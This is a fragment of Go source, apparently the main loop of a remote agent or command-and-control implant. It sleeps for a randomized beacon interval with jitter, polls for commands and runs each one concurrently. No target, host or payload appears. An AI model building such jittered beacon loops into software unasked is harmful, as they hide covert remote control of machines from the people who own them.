			beaconDelay := time.Duration(minDelay+rand.Intn(maxDelay-minDelay+1)) * time.Second
			maxJitter := 60
			jitterMax := time.Duration(rand.Intn(maxJitter+1)) * time.Second
			jitter := time.Duration(0)
			if jitterMax > 0 {
				jitter = time.Duration(time.Now().UnixNano() % int64(jitterMax))
			}
			sleepDuration = beaconDelay + jitter
		}
		time.Sleep(sleepDuration)

		commands, err := beacon()
		if err != nil {
			logf("Beacon error: %v", err)
			continue
		}
		if len(commands) > 0 && config.DebugMode {
			logf("Received %d command(s)", len(commands))
		}
		for _, cmd := range commands {
			go processCommand(cmd)
		}
	}
}